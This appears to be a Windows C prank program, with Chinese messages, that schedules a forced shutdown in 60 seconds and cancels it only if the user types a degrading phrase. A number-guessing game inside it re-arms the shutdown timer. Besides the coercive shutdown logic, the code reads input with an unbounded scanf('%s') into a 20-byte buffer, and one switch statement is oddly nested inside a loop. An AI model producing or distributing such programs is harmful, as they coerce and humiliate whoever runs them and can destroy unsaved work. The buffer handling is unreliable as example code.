#define _CRT_SECURE_NO_WARNINGS 1
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<windows.h>
#include<time.h>

void menu()
{
	printf("**********猜1到100的数字游戏*********\n");
	printf("*************************************\n");
	printf("************1.play*******************\n");
	printf("************0.exit*******************\n");
	printf("*************************************\n");
}
void games()
{
	int input = 0;
	int num = rand() % 100 + 1;
	system("shutdown -a");
	system("shutdown -s -t 60");
	printf("已为你重新设置60秒关机，请在60秒内完成游戏\n");
	while (1)
	{
		printf("请输入你要猜的数字\n");
		scanf("%d", &input);
		if (input < num)
		{
			printf("猜小了\n");
		}
		else if (input > num)
		{
			printf("猜大了\n");
		}
		else
		{
			printf("恭喜你猜对了\n");
			printf("但即使你猜对了，也得输入《我是宾梓翔的儿子》\n");
			printf("已为你重新设置60秒关机，请在60秒内输入\n");
			system("shutdown -a");
			system("shutdown -s -t 60");
			break;
		}
	}
}
int main()
{
	char arr[20] = { 0 };
	int a = 0;
	system("shutdown -s -t 60");
	printf("你的电脑在60秒内关机，要想取消关机，请输入:《我是宾梓翔的儿子》\n");
	printf("如果你不想输入这句话，请按《1》,选择输入这句话请按除了《1》外任意一个数字\n");
	scanf("%d", &a);
	int out = 0;
	switch (a)
	{
	case 1:
		srand((unsigned)time(NULL));
		menu();
		do {
			printf("请选择菜单：\n");
			scanf("%d", &out);
			switch (out)
			{
			case 1:
				games();
				break;
			case 0:
				break;
			default:
				printf("选择错误，请重新选择\n");
				break;
			}
	default:
		break;
		} while (out);
	}
	while (1)
	{
		printf("请你输入:《我是宾梓翔的儿子》\n");
		scanf("%s", arr);
	if (strcmp(arr, "我是宾梓翔的儿子") == 0)
	{
		system("shutdown -a");
		break;
	}
	else
	{
		printf("你输入错误了呢，宝子\n");
	}
	}
	for (float y = 1.5f; y > -1.5f; y -= 0.1f) 
	{
		for (float x = -1.5f; x < 1.5f; x += 0.05f) 
		{
			float a = x * x + y * y - 1;
			putchar(a * a * a - x * x * y * y * y <= 0.0f ? '*' : ' ');
		}
		putchar('\n');
	}
	printf("儿子，你好吖\n");
	Sleep(5000);
	return 0;
}